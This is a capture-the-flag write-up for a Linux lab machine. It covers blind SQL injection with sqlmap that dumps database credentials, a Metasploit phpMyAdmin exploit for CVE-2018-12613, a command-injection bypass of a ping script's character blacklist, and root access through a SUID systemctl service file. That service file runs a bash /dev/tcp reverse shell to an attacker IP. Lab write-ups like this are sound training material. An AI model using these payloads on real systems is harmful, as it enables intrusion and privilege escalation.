**Date**: 2026-05-02
**Difficulty**: Medium
**OS**: Linux
**Tags**: **Tags**: #blind-sqli #sqlmap #phpmyadmin #cve-2018-12613 #metasploit #blacklist-bypass #suid #systemctl

## TL;DR

22/80 → website → Blind SQLi in room selection → phpmyadmin → reverse shell as `www-data` →`pepper` through `simpler.py` → `root` through `systemctl`
## Recon

### Nmap

1.  `sudo nmap -p- --min-rate=5000 -T4 10.129.229.137 -oN ports.txt`
	Open ports: 
	- 22/tcp
	- 80/tcp
	
2. `sudo nmap -p PORTS -sC -sV -oA detailed IP`
	22/tcp - SSH (OpenSSH 7.4p1)
	80/tcp - HTTP (Apache 2.4.25)
	
3. `sudo nmap -sU --top-ports 100 -T4 IP`
	Nothing interesting

## Web

- The only active buttons on the default page are room bookings
- Room selection is based on `cod` → potential SQLi
## SQLi

Upon checking different parameters, the website gives different rooms when we manually change `cod` → it may be vulnerable.

1. `sqlmap -u "http://supersecurehotel.htb/room.php?cod=-1" --dbms=mysql`
```
Parameter: cod (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: cod=-1 AND (SELECT 9028 FROM (SELECT(SLEEP(5)))BRUq)

```

2. Blind SQLi was confirmed. For the simplification of the process I saved the GET request received from Burp as requests.txt and used it as a parameter for the following commands.
`sqlmap -r request.txt --batch --dbms=mysql --technique=T --dbs --time-sec=10`
```
available databases [4]:  
[*] hotel  
[*] information_schema  
[*] mysql  
[*] performance_schema
```

3. I set `-T` as `user` without inspecting the db to speed up the process of password searching.
`sqlmap -r request.txt --batch --dbms=mysql --technique=T -D mysql -T user --dump`
```
[20:42:33] [INFO] retrieved: Host
[20:43:28] [INFO] retrieved: User
[20:44:14] [INFO] retrieved: Password
```
4. `sqlmap -r request.txt --batch --dbms=mysql --technique=T -D mysql -T user -C "Host,User,Password" --dump --time-sec=10`
```
 Host      | User    | Password                                             |
+-----------+---------+------------------------------------------------------+
| localhost | DBadmin | *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0 (imissyou) 
```

There must be a mysql database with admin creds `DBadmin:imissyou` on the website.
## Directory bruteforce

1. `ffuf -w //usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://supersecurehotel.htb/FUZZ -o ffuf_hotel -recursion -fc 404 -c -e .php,.exe,.bak,.txt,.js`
```
js                      [Status: 301]  
css                     [Status: 301]  
index.php               [Status: 200]  
fonts                   [Status: 301]  
phpmyadmin              [Status: 301]  
nav.php                 [Status: 200]  
footer.php              [Status: 200]
```

`phpmyadmin` looks interesting

## Foothold — RCE in phpmyadmin

1. After l logged in as `DBadmin`, I found that the version of phpmyadmin (4.8.0) is vulenrable to CVE-2018–12613.
2. Using exploit `phpmyadmin_lfi_rce` in metasploit I exploited the RCE and got reverse shell as `www-data`
## Lateral movement

1.  I found a potential vulnerable spot via `sudo -l`
```
Matching Defaults entries for www-data on jarvis:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  
  
User www-data may run the following commands on jarvis:  
   (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

2. Upon expecting the code of `simpler.py` I found that it may be vulnerable in `os.system` that calls the ping function if `ip` has no forbidden character.
```
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

```

3. To bypass the filter, I used `$(bash)` from PayloadsAllTheThings that gave me a non-interactive shell as `pepper`.
4. To make `pepper` active, I set up `nc -lnvp 1234` on my machine and ran `nc 10.10.17.151 1234'` on a non-interactive `pepper`.
5. I got an interactive `pepper` 
```
pepper@jarvis:~$ cat user.txt
cat user.txt
3ebc12020b3740f17060b0b2df2a1609
```
## Privilege Escalation

1.`pepper@jarvis:~$ find / -perm -4000 -type f 2>/dev/null` 
```
find / -perm -4000 -type f 2>/dev/null
/bin/fusermount
/bin/mount
/bin/ping
/bin/systemctl
/bin/umount
/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
2. `systemctl` looks unusual and it is! Upon checking on GTFOBins it turned to be vulnerable.
3. Created service file at `/dev/shm/file`:
```
echo '[Unit]
Description=Reverse shell
[Service]
Type=simple
User=root
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.10.17.151/4444 0>&1"
[Install]
WantedBy=multi-user.target' > /dev/shm/file
```

4. Started listener: `nc -lvnp 4444`

5. Linked and started service:
```
sudo systemctl link /dev/shm/file
sudo systemctl start file
```

Got root reverse shell.

```
root@jarvis:/root# cat root.txt
cat root.txt
08ab7273f408f1ed17a7fc6db1c045c1
root@jarvis:/root# 
```